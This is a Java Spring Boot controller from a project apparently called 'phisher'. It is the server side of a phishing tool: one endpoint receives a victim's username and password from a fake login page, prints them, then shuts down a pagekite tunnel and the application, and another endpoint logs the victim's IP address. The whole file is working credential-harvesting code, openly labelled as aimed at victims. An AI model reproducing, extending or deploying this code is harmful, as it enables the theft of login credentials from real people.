package com.shaw.phisher.controllers;

import com.shaw.phisher.PhisherApplication;
import com.shaw.phisher.models.DataModel;
import com.shaw.phisher.utils.Command;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@RestController
public class DataController {
    @PostMapping("/api/post_data")
    public void postedDetails(@RequestBody DataModel dataModel) {
        System.out.println("\nVictim's Login Credentials");
        System.out.println("Username: " + dataModel.getUsername());
        System.out.println("Password: " + dataModel.getPassword());

        if (Command.pagekiteProcess != null)
            Command.pagekiteProcess.destroyForcibly();

        PhisherApplication.ctx.close();
    }

    @PostMapping("/api/post_ip")
    public String postedDetails(HttpServletRequest request) throws IOException {
        System.out.println("Victim's IP Address: " + request.getReader().readLine());
        System.out.println("\nWaiting for victim to login with credentials");
        return "ok";
    }
}
